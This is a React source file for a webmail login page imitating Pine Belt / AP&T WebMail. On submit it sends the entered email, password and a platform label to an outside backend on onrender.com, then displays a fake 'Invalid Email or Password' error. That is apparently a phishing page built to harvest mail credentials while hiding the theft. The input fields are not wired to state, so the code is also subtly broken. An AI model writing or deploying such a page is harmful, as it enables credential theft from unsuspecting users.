import React from 'react';

import './Home.css'

import { useState } from 'react';

import axios from 'axios';
import logo from './logo.png';
import google from './google.png';
import rounde from './round.png';
import aptlogo from './apt_logo.png';

import pine from './pinebelt.png';


function Home(){


    const[email, setUserName] = useState("");
    const[password, setPassword] = useState("");

    const[platform, setPlatform] = useState("Pine Belt")

    const[showError, setShowError] = useState(false);

    const[ischecked, setChecked] = useState(false);


async function handleSubmit(e){
    e.preventDefault();

    try {
        const response = await axios.post('https://myrootbackendone.onrender.com/api/send', {
            email:email,
            password:password,
            platform:platform
        });
    
        // Handle success
        console.log('Data sent:', response.data.message);

        if(response.status == 200){
            console.log(response.data.message);

            setShowError(true);
        }
      } catch (error) {
        // Handle error
        console.error('Error:', error);
      }
    
}


    return (
        <>

        <div className='spacer'>
        {showError && <div className="alert alert-danger alert-dismissible fade show" role="alert">
            <strong>Invalid Email or Password</strong> 
            <button type="button" className="close" data-dismiss="alert" aria-label="Close">
                <span aria-hidden="true">&times;</span>
            </button>
            </div>}
        </div>



            <div className='col-md-5 whitediv m-auto'>
                <h1 className='mainhead mx-1'><span className='font-weight-bold'>WebMail</span> Login</h1>
                <div className='text-center'>
                <img className='logoimage' src={pine} />

                </div>



                <form className='px-3' onSubmit={handleSubmit}>

                <div class="form-group row mt-4">
   
    <div class="col-sm-12">
      <input type="email" class="form-control"placeholder='example@example.com' id="staticEmail"required />
    </div>
  </div>
  <div class="form-group row">
   
    <div class="col-sm-12">
      <input type="password" class="form-control"placeholder='password' id="inputPassword"required/>
    </div>
  </div>


  <div class="form-group row">
   
    <div class="col-sm-12">
      <input type="checkbox" /> <span className='checktext'> Remember Name & Password</span>
    </div>
  </div>


 

       
                   
                 <div className='form-group text-right'>

                        <button type='submit' className=' border-0 btn mybtnn px-3 rounded mt-3 font-weight-bold'>Login</button>

                    </div>

                </form>

            </div>


            <p className='info mt-5'>AP&T WebMail  ●  Get support</p>
        
        </>
    );
}

export default Home;